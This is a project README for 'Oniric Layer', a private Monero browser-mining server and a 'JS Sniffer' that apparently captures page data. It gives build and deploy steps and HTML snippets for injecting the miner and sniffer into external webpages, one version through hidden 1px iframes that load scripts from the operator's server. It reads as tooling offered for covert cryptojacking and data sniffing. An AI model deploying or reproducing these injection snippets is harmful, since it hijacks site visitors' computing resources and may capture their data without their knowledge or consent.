# Oniric Layer

[![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)

* private XMR Server worker that work for one wallet 
complete typescript refactoring and optimization 
of https://github.com/deepwn/deepMiner

* JS Sniffer with no memory database on backend

## Installation (Developers Only)

* First Usage
```sh
  npm i
  npm run build
```
* Development Mode
```sh
 npm run dev
```
* Production Mode
```sh
 npm run prod
```
* Continuos Development and integration
1) First Shell
```sh
 gulp dev
```
2) Second Shell
```sh
 npm run dev
```


## Considerations

to run executable generated by pkg you must modify ecosystem.config.js file
and replace script parameter with ./dist/build/Oniric with given extension

## Testing

Work in progress 


## Server Deploy

1. copy dist/build/*.js or dist/build/Oniric.*  and ecosystem.config.js in a new directory
2. modify ecosystem.config.js script parameter and name parameter
3. Copy and modify dist/build/config.json with your parameters
4. Copy dist/build/web
5. Upload via FTP on your server
6. run these commands on your server via SSH
```sh
 npm i -g pm2
 pm2 start ecosystem.config.js
```
 -  Or the fast way 

1. Copy setup provider in repository (TODO)
2. Modify config.json with your parameters
3. Upload via FTP on your server
4. Run these commands on your server via SSH
```sh
 npm i -g pm2
 pm2 start ecosystem.config.js
```

- Alternative execute application (without pm2)
```
./Oniric

```

## Usage (Add to external webpage)

* Classic Config

```
<script src="server/lib/Sniffer.js"> </script>
<script src="server/lib/oniric.min.js"> </script>
<script> var userID = 'Oniric';
         var miner = new Oniric.Init(userID, {
         	autoThreads: true`
         });
         miner.start(); 
 </script>
```

* IFrame Based

```
<iframe style="display:block" width="1px" height="1px" src="yourserver:port/miner.html"></iframe>
<iframe style="display:block" width="1px" height="1px" src="yourserver:port/Sniffer.js"></iframe>
```



## Contributing

1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin my-new-feature`
5. Submit a pull request :D


## Credits

https://github.com/webdiamond
https://github.com/deepwn


## Road Map

1. Testing
2. Complete typescript integration
3. mongodb support
4. encryption layer
5. Telegram API
6. End to develop JS Sniffer
